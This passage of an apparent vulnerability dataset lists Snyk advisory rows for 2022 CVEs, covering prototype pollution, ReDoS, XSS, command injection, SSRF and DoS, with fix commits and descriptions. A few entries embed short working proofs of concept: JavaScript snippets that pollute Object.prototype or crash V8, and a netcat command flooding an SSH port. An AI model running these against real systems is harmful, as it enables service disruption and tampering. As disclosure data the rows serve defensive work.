* fix(discord): typo in meta message

Co-authored-by: Justin Steven <justin@justinsteven.com>",Go,5.9,medium,"github.com/containrrr/shoutrrr/pkg/util is a notification library for gophers.
Affected versions of this package are vulnerable to Denial of Service (DoS) via the util.PartitionMessage function. Exploiting this vulnerability is possible by sending exactly 2000, 4000, or 6000 characters messages.",2022
CVE-2022-25858,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-JS-TERSER-2806366,14/07/2022,02/05/2022,https://github.com/terser/terser/commit/a4da7349fdc92c05094f41d33d06d8cd4e90e76b,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/terser/terser/commits/a4da7349fdc92c05094f41d33d06d8cd4e90e76b,Fábio Santos,fabiosantosart@gmail.com,terser,a4da7349fdc92c05094f41d33d06d8cd4e90e76b,fix potential regexp DDOS,JavaScript,5.3,medium,Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure usage of regular expressions.,2022
CVE-2022-25875,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-SVELTE-2931080,11/07/2022,17/06/2022,https://github.com/sveltejs/svelte/commit/f8605d6acbf66976da9b4547f76e90e163899907,Cross-site Scripting (XSS),https://api.github.com/repos/sveltejs/svelte/commits/f8605d6acbf66976da9b4547f76e90e163899907,Maurício Kishi,mrkishi@users.noreply.github.com,svelte,f8605d6acbf66976da9b4547f76e90e163899907,[fix] harden attribute escaping during ssr (#7530),TypeScript,5.4,medium,"svelte is a package for building web applications.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper input sanitization and to improper escape of attributes when using objects during SSR (Server-Side Rendering).
Exploiting this vulnerability is possible via objects with a custom toString() function.",2022
CVE-2022-25896,CWE-384,Snyk,https://security.snyk.io/vuln/SNYK-JS-PASSPORT-2840631,29/06/2022,20/05/2022,https://github.com/jaredhanson/passport/commit/7e9b9cf4d7be02428e963fc729496a45baeea608,Session Fixation,https://api.github.com/repos/jaredhanson/passport/commits/7e9b9cf4d7be02428e963fc729496a45baeea608,Jared Hanson,jaredhanson@gmail.com,passport,7e9b9cf4d7be02428e963fc729496a45baeea608,Regenerate session on login.,JavaScript,4.8,medium,"passport is a Simple, unobtrusive authentication for Node.js.
Affected versions of this package are vulnerable to Session Fixation. When a user logs in or logs out, the session is regenerated instead of being closed.",2022
CVE-2022-25900,CWE-88,Snyk,https://security.snyk.io/vuln/SNYK-JS-GITCLONE-2434308,28/06/2022,28/03/2022,https://github.com/jaz303/git-clone/commit/fd330459593aef7c7a8c54d786e3c4d5722749f9,Improper Neutralization of Argument Delimiters in a Command ('Argument Injection'),https://api.github.com/repos/jaz303/git-clone/commits/fd330459593aef7c7a8c54d786e3c4d5722749f9,Jason Frame,jwf@jasonframe.co.uk,git-clone,fd330459593aef7c7a8c54d786e3c4d5722749f9,Add security notice about args option,Markdown,8.1,high,"git-clone is a Clone a git repository
Affected versions of this package are vulnerable to Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') due to insecure usage of the --upload-pack feature of git.
Note: A note was added to the README file of the package to only use the args option with static/trusted input!",2022
CVE-2020-4988,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-LOOPBACKREST-2935904,26/06/2022,26/06/2022,https://github.com/loopbackio/loopback-next/commit/b38f0fda4c1c78339de5f02c2f42bbfce32113c9,Prototype Pollution,https://api.github.com/repos/loopbackio/loopback-next/commits/b38f0fda4c1c78339de5f02c2f42bbfce32113c9,Raymond Feng,enjoyjava@gmail.com,loopback-next,b38f0fda4c1c78339de5f02c2f42bbfce32113c9,"feat(rest): further sanitize json parsing by rejecting prohibited keys

- reject `__proto__` and `constructor.prototype` by default
- allow validation options to provide additional prohibitedKeys

Signed-off-by: Raymond Feng <enjoyjava@gmail.com>",TypeScript,7.3,high,"@loopback/rest is a The REST API package for loopback-next
Affected versions of this package are vulnerable to Prototype Pollution via JSON payloads containing constructor.",2022
CVE-2022-25898,CWE-347,Snyk,https://security.snyk.io/vuln/SNYK-JS-JSRSASIGN-2869122,26/06/2022,13/06/2022,https://github.com/kjur/jsrsasign/commit/4536a6e9e8bcf1a644ab7c07ed96e453347dae41,Improper Verification of Cryptographic Signature,https://api.github.com/repos/kjur/jsrsasign/commits/4536a6e9e8bcf1a644ab7c07ed96e453347dae41,Kenji Urushima,kenji.urushima@gmail.com,jsrsasign,4536a6e9e8bcf1a644ab7c07ed96e453347dae41,CVE-2022-25898 Security fix in JWS and JWT validation,Unknown,7.7,high,"jsrsasign is a free pure JavaScript cryptographic library.
Affected versions of this package are vulnerable to Improper Verification of Cryptographic Signature when JWS or JWT signature with non Base64URL encoding special characters or number escaped characters may be validated as valid by mistake.",2022
CVE-2022-21189,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-DEXIE-2607042,28/04/2022,11/04/2022,https://github.com/dexie/Dexie.js/commit/1d655a69b9f28c3af6fae10cf5c61df387dc689b,Prototype Pollution,https://api.github.com/repos/dexie/Dexie.js/commits/1d655a69b9f28c3af6fae10cf5c61df387dc689b,dfahlander,david.fahlander@gmail.com,Dexie.js,1d655a69b9f28c3af6fae10cf5c61df387dc689b,Prohibit prototype pollution,TypeScript,7.3,high,"Affected versions of this package are vulnerable to Prototype Pollution in the Dexie.setByKeyPath(obj, keyPath, value) function which does not properly check the keys being set (like __proto__ or constructor). This can allow an attacker to add/modify properties of the Object.prototype leading to prototype pollution vulnerability.
Note: This vulnerability can occur in multiple ways, for example when modifying a collection with untrusted user input.",2022
CVE-2022-25273,CWE-20,Snyk,https://security.snyk.io/vuln/SNYK-PHP-DRUPALCORE-2804256,27/04/2022,27/04/2022,https://github.com/drupal/core/commit/9006e23d6368d5771cefabed63269930f17549ed,Improper Input Validation,https://api.github.com/repos/drupal/core/commits/9006e23d6368d5771cefabed63269930f17549ed,xjm,xjm@65776.no-reply.drupal.org,core,9006e23d6368d5771cefabed63269930f17549ed,"SA-CORE-2022-008 by mxr576, xjm, effulgentsia, mxr576, larowlan",PHP,7.5,high,"drupal/core is an an open source content management platform powering millions of websites and applications.
Affected versions of this package are vulnerable to Improper Input Validation which allow an attacker to inject disallowed values or overwrite data.",2022
CVE-2022-25274,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-PHP-DRUPALCORE-2803581,27/04/2022,26/04/2022,https://github.com/drupal/drupal/commit/ed4b437ad902e05a63704ae1b76297a76c776224,Access Control Bypass,https://api.github.com/repos/drupal/drupal/commits/ed4b437ad902e05a63704ae1b76297a76c776224,xjm,xjm@65776.no-reply.drupal.org,drupal,ed4b437ad902e05a63704ae1b76297a76c776224,"SA-CORE-2022-009 by kristiaanvandeneynde, larowlan, acbramley, xjm, longwave, catch, jibran, benjifisher",PHP,5.4,medium,"drupal/core is an an open source content management platform powering millions of websites and applications.
Affected versions of this package are vulnerable to Access Control Bypass via a generic entity access API which was not completely integrated with existing permissions, resulting in some possible access bypass for users who have access to use revisions of content generally, but who do not have access to individual items of node and media content.",2022
CVE-2022-25303,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-WHOOGLESEARCH-2803306,27/04/2022,26/04/2022,https://github.com/benbusby/whoogle-search/commit/abc30d7da3b5c67be7ce84d4699f327442d44606,Cross-site Scripting (XSS),https://api.github.com/repos/benbusby/whoogle-search/commits/abc30d7da3b5c67be7ce84d4699f327442d44606,Ben Busby,contact@benbusby.com,whoogle-search,abc30d7da3b5c67be7ce84d4699f327442d44606,"Render error message w/o `safe` filter

The error message shown in the error template does not need to be
rendered using the safe filter, and furthermore opens up an XSS
vulnerability.",HTML,5.4,medium,"whoogle-search is a Self-hosted, ad-free, privacy-respecting metasearch engine
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via the query string parameter q. In the case where it does not contain the http string, it is used to build the error_message that is then rendered in the error.html template, using the flask.render_template function. However, the error_message is rendered using the | safe filter, meaning the user input is not escaped.",2022
CVE-2022-25866,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-PHP-CZPROJECTGITPHP-2421349,25/04/2022,11/03/2022,https://github.com/czproject/git-php/commit/5e82d5479da5f16d37a915de4ec55e1ac78de733,Command Injection,https://api.github.com/repos/czproject/git-php/commits/5e82d5479da5f16d37a915de4ec55e1ac78de733,Jan Pecha,janpecha@email.cz,git-php,5e82d5479da5f16d37a915de4ec55e1ac78de733,Uses --end-of-options after command options (for security reasons),PHP,8.1,high,"czproject/git-php is a Library for work with Git repository in PHP.
Affected versions of this package are vulnerable to Command Injection via git argument injection. When calling the isRemoteUrlReadable($url, array $refs = NULL) function, both the url and refs parameters are passed to the git ls-remote subcommand in a way that additional flags can be set. The additional flags can be used to perform a command injection.",2022
CVE-2022-25854,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-YAIREOTAGIFY-2404358,24/04/2022,17/02/2022,https://github.com/yairEO/tagify/commit/198c0451fad188390390395ccfc84ab371def4c7,Cross-site Scripting (XSS),https://api.github.com/repos/yairEO/tagify/commits/198c0451fad188390390395ccfc84ab371def4c7,Yair Even Or,Yair.Even-Or@amdocs.com,tagify,198c0451fad188390390395ccfc84ab371def4c7,fixes #989 - fix XSS,JavaScript,5.4,medium,"Affected versions of this package are vulnerable to Cross-site Scripting (XSS). The package is used for rendering UI components inside the input or text fields, and an attacker can pass a malicious placeholder value to it to fire the XSS payload.",2022
CVE-2022-26945,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMHASHICORPGOGETTER-2421223,25/05/2022,11/03/2022,https://github.com/hashicorp/go-getter/commit/38e97387488f5439616be60874979433a12edb48,Command Injection,https://api.github.com/repos/hashicorp/go-getter/commits/38e97387488f5439616be60874979433a12edb48,Wilken Rivera,dev@wilkenrivera.com,go-getter,38e97387488f5439616be60874979433a12edb48,"Multiple fixes for go-getter v2 (#361)

* Fix command injection in go-getter when passing params to hg clone

The fix for this is to add -- to the arguments of each hg command,
before any user-input. This indicates the end of optional arguments,
only positional arguments are allowed.

* Remove upwards path traversal in subdirectories, filenames

* Prevent arbitrary file read, path traversal via subdirectory extraction
Not opt-in or opt-out, just never allowed. Upwards path traversal is not a subdirectory.

*Prevent arbitrary file write via `filename`
Not opt-in or opt-out, just never allowed. Upwards path traversal is not a filename in a subdirectory.

* Add Timeout option to HgGetter and GitGetter enforced with os/exec.CommandContext

* Add DisableSymlinks option to getter request

The fix for this is a new client request option, DisableSymlinks. When set to true, symlinks are disabled.
This prevents the client, likely in combination with the GitGetter, from following a symlink when the subdirectory
selection from the checked out repo is a symlink.

* Add custom symlink copy error

* Add DisableSymlinks as client option

Setting DisableSymlinks per request works but must be set on all request
made by a client. Adding it as a top-level client config option allows
for setting DisableSymlinks for all client.Get requests.

* Update get_http to address various get concerns

* Add XTerraformGetLimit and XTerraformGetDisabled
* Add Multiple new options to limit resource consumption:
  DoNotCheckHeadFirst, HeadFirstTimeout, ReadTimeout, MaxBytes
* Add getter client to context for reuse
* Add setters/getters for storing configured getter.Client in a context
* Update HttpGetter to use ClientFromContext when available; otherwise
  use a limited client for supporting X-Terraform-Get request
* Refactor HttpGetter function to make it clear when a configured
  getter.Client is required
* Add security section to README

* Port changes from hashicorp/eastebry/timeout-for-getters

Adding timeout to s3Getter

* Port changes from from hashicorp/add-missing-timeouts

Add missing timeouts to `S3Getter` and `GCSGetter`

* Remove windows test for FileGetter

* Change to next-get image

Co-authored-by: Kent 'picat' Gruber <kent@hashicorp.com>
Co-authored-by: Sylvia Moss <sylviamoss.m@gmail.com>",Config files,8.1,high,"github.com/hashicorp/go-getter is a Package for downloading things from a string URL using a variety of protocols.
Affected versions of this package are vulnerable to Command Injection via hg argument injection. When calling the new(gogetter.HgGetter).get() function, the dst parameter is passed to the hg clone command in a way that additional flags can be set. The additional flags can be used to perform a command injection.",2022
CVE-2022-25878,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-PROTOBUFJS-2441248,23/05/2022,06/04/2022,https://github.com/protobufjs/protobuf.js/commit/b5f1391dff5515894830a6570e6d73f5511b2e8f,Prototype Pollution,https://api.github.com/repos/protobufjs/protobuf.js/commits/b5f1391dff5515894830a6570e6d73f5511b2e8f,Alexander Fenster,fenster@google.com,protobuf.js,b5f1391dff5515894830a6570e6d73f5511b2e8f,fix: do not let setProperty change the prototype (#1731),JavaScript,8.2,high,"protobufjs is a protocol buffer for JavaScript (& TypeScript).
Affected versions of this package are vulnerable to Prototype Pollution which can allow an attacker to add/modify properties of the Object.prototype.
This vulnerability can occur in multiple ways:

by providing untrusted user input to util.setProperty or to ReflectionObject.setParsedOption functions
by parsing/loading .proto files",2022
CVE-2022-21122,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-METACALC-2826197,30/05/2022,17/05/2022,https://github.com/metarhia/metacalc/commit/625c23d63eabfa16fc815f5832b147b08d2144bd,Arbitrary Code Execution,https://api.github.com/repos/metarhia/metacalc/commits/625c23d63eabfa16fc815f5832b147b08d2144bd,Timur Shemsedinov,timur.shemsedinov@gmail.com,metacalc,625c23d63eabfa16fc815f5832b147b08d2144bd,"Prevent arbitrary js code execution

PR-URL: https://github.com/metarhia/metacalc/pull/16",Markdown,9.0,critical,"metacalc is a Spreadsheet calculations for Metarhia
Affected versions of this package are vulnerable to Arbitrary Code Execution when it exposes JavaScript's Math class to the v8 context. As the Math class is exposed to user-land, it can be used to get access to JavaScript's Function constructor.",2022
CVE-2022-25865,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-WORKSPACETOOLS-2421201,11/05/2022,11/03/2022,https://github.com/microsoft/workspace-tools/commit/9bc7e65ce497f87e1f363fd47b8f802f3d3cd978,Command Injection,https://api.github.com/repos/microsoft/workspace-tools/commits/9bc7e65ce497f87e1f363fd47b8f802f3d3cd978,Kenneth Chau,34725+kenotron@users.noreply.github.com,workspace-tools,9bc7e65ce497f87e1f363fd47b8f802f3d3cd978,"Fix git fetch - addresses a potential security concern regarding git fetch (#103)

* fixes a potential security issue where fetch --upload-pack can allow for command injection

* Change files",Config files,8.1,high,"workspace-tools is a JS Monorepo Workspace Tools.
Affected versions of this package are vulnerable to Command Injection via git argument injection. When calling the fetchRemoteBranch(remote: string, remoteBranch: string, cwd: string) function, both the remote and remoteBranch parameters are passed to the git fetch subcommand in a way that additional flags can be set. The additional flags can be used to perform a command injection.",2022
CVE-2022-21190,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-CONVICT-2774757,09/05/2022,24/04/2022,https://github.com/mozilla/node-convict/commit/3b86be087d8f14681a9c889d45da7fe3ad9cd880,Prototype Pollution,https://api.github.com/repos/mozilla/node-convict/commits/3b86be087d8f14681a9c889d45da7fe3ad9cd880,Marc-Aurèle DARCHE,madarche@users.noreply.github.com,node-convict,3b86be087d8f14681a9c889d45da7fe3ad9cd880,"More complete fix against prototype pollution

first addressed in https://github.com/mozilla/node-convict/pull/384",JavaScript,7.5,high,"convict is a package that expands on the standard pattern of configuring node.js applications in a way that is more robust and accessible to collaborators, who may have less interest in digging through imperative code in order to inspect or modify settings. By introducing a configuration schema, convict gives project collaborators more context on each setting and enables validation and early failures for when configuration goes wrong.
Affected versions of this package are vulnerable to Prototype Pollution. This is a bypass of CVE-2022-22143.
The fix introduced, relies on the startsWith method and does not prevent the vulnerability: before splitting the path, it checks if it starts with __proto__ or this.constructor.prototype. To bypass this check it's possible to prepend the dangerous paths with any string value followed by a dot, like for example foo.__proto__ or foo.this.constructor.prototype.",2022
CVE-2022-21227,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-SQLITE3-2388645,28/04/2022,31/01/2022,https://github.com/TryGhost/node-sqlite3/commit/593c9d498be2510d286349134537e3bf89401c4a,Denial of Service (DoS),https://api.github.com/repos/TryGhost/node-sqlite3/commits/593c9d498be2510d286349134537e3bf89401c4a,Kewde,kewde@particl.io,node-sqlite3,593c9d498be2510d286349134537e3bf89401c4a,"bug: fix segfault of invalid toString() object (#1450)

* bug: verify toString() returns valid data
* test: faulty toString test",C/C++,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS) which will invoke the toString function of the passed parameter. If passed an invalid Function object it will throw and crash the V8 engine.,2022
CVE-2022-21144,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-LIBXMLJS-2348756,06/04/2022,20/01/2022,https://github.com/libxmljs/libxmljs/commit/2501807bde9b38cfaed06d1e140487516d91379d,Denial of Service (DoS),https://api.github.com/repos/libxmljs/libxmljs/commits/2501807bde9b38cfaed06d1e140487516d91379d,rchipka,chipka01@email.franklin.edu,libxmljs,2501807bde9b38cfaed06d1e140487516d91379d,Ensure parseXml/parseHtml input is string or buffer (#594),Config files,7.5,high,"libxmljs is a libxml bindings for v8 javascript engine
Affected versions of this package are vulnerable to Denial of Service (DoS). When invoking the libxmljs.parseXml  function with a non-buffer argument the V8 code will attempt invoking the .toString method of the argument. If the argument's toString  value is not a Function
object V8 will crash. 
PoC:

  let libxmljs = require(""libxmljs""); 
  let xml = {toString: 1 }; 
  libxmljs.parseXml(xml);",2022
CVE-2021-43177,CWE-330,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-DEVISETWOFACTOR-2411377,10/04/2022,23/02/2022,https://github.com/tinfoil/devise-two-factor/commit/64576bb9e7d29800c5f92bb86fb6ecff91ad6105,Time-Based One-Time Password (TOTP) Reuse,https://api.github.com/repos/tinfoil/devise-two-factor/commits/64576bb9e7d29800c5f92bb86fb6ecff91ad6105,Ben Sedat,bsedat@synopsys.com,devise-two-factor,64576bb9e7d29800c5f92bb86fb6ecff91ad6105,Use `after` option of TOTP#verify for additional timestamp verification,Ruby,5.3,medium,"Affected versions of this package are vulnerable to Time-Based One-Time Password (TOTP) Reuse due to an improper fix of CVE-2015-7225, which makes it possible to reuse the OPT after 1 interval (30 seconds by default).
If otp_allowed_drift is configured, the OTP will be valid for the entire duration of that drift period.",2022
CVE-2022-24437,CWE-88,Snyk,https://security.snyk.io/vuln/SNYK-JS-GITPULLORCLONE-2434307,08/04/2022,28/03/2022,https://github.com/feross/git-pull-or-clone/commit/f9ce092be13cc32e685dfa26e7705e9c6e3108a3,Improper Neutralization of Argument Delimiters in a Command ('Argument Injection'),https://api.github.com/repos/feross/git-pull-or-clone/commits/f9ce092be13cc32e685dfa26e7705e9c6e3108a3,Liran Tal,liran.tal@gmail.com,git-pull-or-clone,f9ce092be13cc32e685dfa26e7705e9c6e3108a3,fix: fix command injection vector,JavaScript,9.8,critical,"git-pull-or-clone is an Ensure a git repo exists on disk and that it's up-to-date
Affected versions of this package are vulnerable to Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') due to the use of the --upload-pack feature of git which is also supported for git clone. The source includes the use of the secure child process API spawn(). However, the outpath parameter passed to it may be a command-line argument to the git clone command and result in arbitrary command injection.",2022
CVE-2022-24066,CWE-88,Snyk,https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-2434306,29/03/2022,28/03/2022,https://github.com/steveukx/git-js/commit/2040de601c894363050fef9f28af367b169a56c5,Improper Neutralization of Argument Delimiters in a Command ('Argument Injection'),https://api.github.com/repos/steveukx/git-js/commits/2040de601c894363050fef9f28af367b169a56c5,Steve King,steve@mydev.co,git-js,2040de601c894363050fef9f28af367b169a56c5,Prevent use of `--upload-pack` as a command in `git.clone` to avoid potential accidental command execution.,Markdown,8.1,high,"simple-git is a light weight interface for running git commands in any node.js application.
Affected versions of this package are vulnerable to Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') due to an incomplete fix of CVE-2022-24433 which only patches against the git fetch attack vector.
A similar use of the --upload-pack feature of git is also supported for git clone, which the prior fix didn't cover.",2022
CVE-2022-22143,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-CONVICT-2340604,28/03/2022,14/01/2022,https://github.com/mozilla/node-convict/commit/3b86be087d8f14681a9c889d45da7fe3ad9cd880,Prototype Pollution,https://api.github.com/repos/mozilla/node-convict/commits/3b86be087d8f14681a9c889d45da7fe3ad9cd880,Marc-Aurèle DARCHE,madarche@users.noreply.github.com,node-convict,3b86be087d8f14681a9c889d45da7fe3ad9cd880,"More complete fix against prototype pollution

first addressed in https://github.com/mozilla/node-convict/pull/384",JavaScript,7.5,high,"convict is a package that expands on the standard pattern of configuring node.js applications in a way that is more robust and accessible to collaborators, who may have less interest in digging through imperative code in order to inspect or modify settings. By introducing a configuration schema, convict gives project collaborators more context on each setting and enables validation and early failures for when configuration goes wrong.
Affected versions of this package are vulnerable to Prototype Pollution via the convict function due to missing validation of parentKey.
Note: This vulnerability derives from an incomplete fix of another vulnerability",2022
CVE-2022-25850,CWE-918,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMHOPPSCOTCHPROXYSCOTCH-2435228,31/03/2022,29/03/2022,https://github.com/hoppscotch/proxyscotch/commit/de67380f62f907f201d75854b76024ba4885fab7,Server-side Request Forgery (SSRF),https://api.github.com/repos/hoppscotch/proxyscotch/commits/de67380f62f907f201d75854b76024ba4885fab7,Andrew Bastin,andrewbastin.k@gmail.com,proxyscotch,de67380f62f907f201d75854b76024ba4885fab7,feat: ability to have a blacklist of target urls for proxy to make calls to,Go,7.5,high,Affected versions of this package are vulnerable to Server-side Request Forgery (SSRF) when interceptor mode is set to proxy. It occurs when an HTTP request is made by a backend server to an untrusted URL submitted by a user. It leads to a leakage of sensitive information from the server.,2022
CVE-2022-24279,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-MADLIBOBJECTUTILS-2388572,22/03/2022,30/01/2022,https://github.com/Qwerios/madlib-object-utils/commit/8d5d54c11c8fb9a7980a99778329acd13e3ef98f,Prototype Pollution,https://api.github.com/repos/Qwerios/madlib-object-utils/commits/8d5d54c11c8fb9a7980a99778329acd13e3ef98f,Mark Doeswijk,mark@springtree.nl,madlib-object-utils,8d5d54c11c8fb9a7980a99778329acd13e3ef98f,fix(set-value): prototype pollution,JavaScript,7.5,high,"madlib-object-utils is an A small set of utility functions for working with objects
Affected versions of this package are vulnerable to Prototype Pollution via the setValue method, as it allows an attacker to merge object prototypes into it.
Note:This vulnerability derives from an incomplete fix of CVE-2020-7701",2022
CVE-2022-25645,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-DSET-2330881,23/03/2022,06/01/2022,https://github.com/lukeed/dset/commit/2d156c7f615877ad11d2586f54865ebdc11e4acc,Prototype Pollution,https://api.github.com/repos/lukeed/dset/commits/2d156c7f615877ad11d2586f54865ebdc11e4acc,Laurin Quast,laurinquast@googlemail.com,dset,2d156c7f615877ad11d2586f54865ebdc11e4acc,fix(merge): prevent possible prototype pollution (#34),JavaScript,6.5,medium,"dset is an A tiny (161B) utility for safely writing deep Object values~!
Affected versions of this package are vulnerable to Prototype Pollution via 'dset/merge' mode, as the dset function checks for prototype pollution by validating if the top-level path contains __proto__, constructor or protorype. 
By crafting a malicious object, it is possible to bypass this check and achieve prototype pollution.
PoC:
// poc.js contains:

const {dset} = require(""dset/merge"")
var a = {b:{c:1}}
console.log(""a.polluted:"",a.polluted)
console.log(""{}.polluted:"",({}).polluted)
dset(a,""b"", JSON.parse('{""proto"":{""polluted"":""Yes!""}}') ) //Needs to craft payload with JSON.parse to keep the object key proto
console.log(""a.polluted:"",a.polluted)
console.log(""{}.polluted:"",({}).polluted)
// Running node poc.js give the output:
a.polluted: undefined
{}.polluted: undefined
a.polluted: Yes!
{}.polluted: Yes!",2022
,CWE-758,Snyk,https://security.snyk.io/vuln/SNYK-JS-EVENTSOURCEPOLYFILL-2429580,18/03/2022,18/03/2022,https://github.com/Yaffle/EventSource/commit/de137927e13d8afac153d2485152ccec48948a7a,Undesired Behavior,https://api.github.com/repos/Yaffle/EventSource/commits/de137927e13d8afac153d2485152ccec48948a7a,Viktor Mukhachev,vmukhachev@rocketsfotware.com,EventSource,de137927e13d8afac153d2485152ccec48948a7a,update,Config files,5.3,medium,"event-source-polyfill is an A polyfill for http://www.w3.org/TR/eventsource/
Affected versions of this package are vulnerable to Undesired Behavior. This package geo-locates users based on their IP address and if the user is Russia-based prints a political protest message in the browser 15 seconds after the package is loaded. The package then tries to redirect the browser into another website via the windows.call command.
Note: This issue affects versions starting with 1.0.26, previous versions other than 1.0.26 are not affected.",2022
CVE-2022-21164,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-NODELMDB-2400723,15/03/2022,14/02/2022,https://github.com/Venemo/node-lmdb/commit/97760104c0fd311206b88aecd91fa1f59fe2b85a,Denial of Service (DoS),https://api.github.com/repos/Venemo/node-lmdb/commits/97760104c0fd311206b88aecd91fa1f59fe2b85a,Kris Zyp,kriszyp@gmail.com,node-lmdb,97760104c0fd311206b88aecd91fa1f59fe2b85a,Perform argument check for putString,C/C++,3.7,low,"Affected versions of this package are vulnerable to Denial of Service (DoS) when defining a non-invokable ToString value, which will cause a crash during type check.",2022
CVE-2022-21221,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMVALYALAFASTHTTP-2407866,15/03/2022,21/02/2022,https://github.com/valyala/fasthttp/commit/6b5bc7bb304975147b4af68df54ac214ed2554c1,Directory Traversal,https://api.github.com/repos/valyala/fasthttp/commits/6b5bc7bb304975147b4af68df54ac214ed2554c1,Erik Dubbelboer,erik@dubbelboer.com,fasthttp,6b5bc7bb304975147b4af68df54ac214ed2554c1,"Add windows support to normalizePath

This is probably still not 100% sure and there are still many bugs with
FS on windows. But it's a slight improvement.

Fixes #1226",Go,5.9,medium,"github.com/valyala/fasthttp is a fast HTTP server and client API.
Affected versions of this package are vulnerable to Directory Traversal via the ServeFile function, due to improper sanitization. It is possible to be exploited by using a backslash %5c character in the path.
Note:  This security issue impacts Windows users only.",2022
CVE-2022-25354,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-SETIN-2388571,14/03/2022,30/01/2022,https://github.com/ahdinosaur/set-in/commit/6bad255961d379e4b1f5fbc52ef9dc8420816f24,Prototype Pollution,https://api.github.com/repos/ahdinosaur/set-in/commits/6bad255961d379e4b1f5fbc52ef9dc8420816f24,Michael Williams,michael.williams@enspiral.com,set-in,6bad255961d379e4b1f5fbc52ef9dc8420816f24,"better fix for prototype pollution vulnerability

cheers Idan Digmi of Snyk Security",JavaScript,8.6,high,"set-in is a set value of nested associative structure given array of keys
Affected versions of this package are vulnerable to Prototype Pollution via the setIn method, as it allows an attacker to merge object prototypes into it.
Note:This vulnerability derives from an incomplete fix of CVE-2020-28273",2022
CVE-2022-25839,CWE-20,Snyk,https://security.snyk.io/vuln/SNYK-JS-URLJS-2414030,07/03/2022,28/02/2022,https://github.com/duzun/URL.js/commit/9dc9fcc99baa4cbda24403d81a589e9b0f4121d0,Improper Input Validation,https://api.github.com/repos/duzun/URL.js/commits/9dc9fcc99baa4cbda24403d81a589e9b0f4121d0,Dumitru Uzun,contact@duzun.me,URL.js,9dc9fcc99baa4cbda24403d81a589e9b0f4121d0,"Fix potential vulnerability for ""http://\\\\localhost""",Config files,4.3,medium,"url-js is a Simple URL parser, similar to DOM URL
Affected versions of this package are vulnerable to Improper Input Validation due to improper parsing, which makes it is possible for the hostname to be spoofed.
http://\\\\\\\\localhost and http://localhost are the same URL. However, the hostname is not parsed as localhost, and the backslash is reflected as it is.",2022
CVE-2022-25352,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-LIBNESTED-2342117,07/03/2022,17/01/2022,https://github.com/dominictarr/libnested/commit/c1129865d75fbe52b5a4f755ad3110ca5420f2e1,Prototype Pollution,https://api.github.com/repos/dominictarr/libnested/commits/c1129865d75fbe52b5a4f755ad3110ca5420f2e1,Michael Williams,michael.williams@enspiral.com,libnested,c1129865d75fbe52b5a4f755ad3110ca5420f2e1,"better fix for prototype pollution vulnerability

cheers Idan Digmi of Snyk Security",JavaScript,7.5,high,"libnested is a package with basic functions (map, each, get, set, keys) for nested objects.
Affected versions of this package are vulnerable to Prototype Pollution via the set function in index.js.
Note:  This vulnerability derives from an incomplete fix for CVE-2020-28283
PoC:
 const libnested = require('libnested');
 libnested.set({}, [
     ['__proto__'],
     'polluted'
 ], 'yes');
 console.log({}.polluted);",2022
CVE-2022-21716,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-TWISTED-2326700,07/03/2022,26/12/2021,https://github.com/twisted/twisted/commit/98387b39e9f0b21462f6abc7a1325dc370fcdeb1,Denial of Service (DoS),https://api.github.com/repos/twisted/twisted/commits/98387b39e9f0b21462f6abc7a1325dc370fcdeb1,Adi Roiban,adiroiban@gmail.com,twisted,98387b39e9f0b21462f6abc7a1325dc370fcdeb1,"Merge pull request from GHSA-rv6r-3f5q-9rgx

[Fix #10284] Fix out of memory deny of service for conch ssh version string handling during handshake.",Python,7.5,high,"Twisted is an event-based network programming and multi-protocol integration framework.
Affected versions of this package are vulnerable to Denial of Service (DoS) by accepting an infinite amount of data for the peer's SSH version identifier. it is possible to be exploited via SSH transport due to a lack of validation for user data.
The attack is as simple as nc -rv localhost 22 < /dev/zero.",2022
CVE-2021-23495,CWE-601,Snyk,https://security.snyk.io/vuln/SNYK-JS-KARMA-2396325,23/02/2022,09/02/2022,https://github.com/karma-runner/karma/commit/ff7edbb2ffbcdd69761bece86b7dc1ef0740508d,Open Redirect,https://api.github.com/repos/karma-runner/karma/commits/ff7edbb2ffbcdd69761bece86b7dc1ef0740508d,Jonathan Ginsburg,jon@than.ml,karma,ff7edbb2ffbcdd69761bece86b7dc1ef0740508d,"fix(security): mitigate the ""Open Redirect Vulnerability""",JavaScript,5.4,medium,"karma is a simple tool that allows you to execute JavaScript code in multiple real browsers.
Affected versions of this package are vulnerable to Open Redirect due to missing validation of the return_url query parameter.",2022
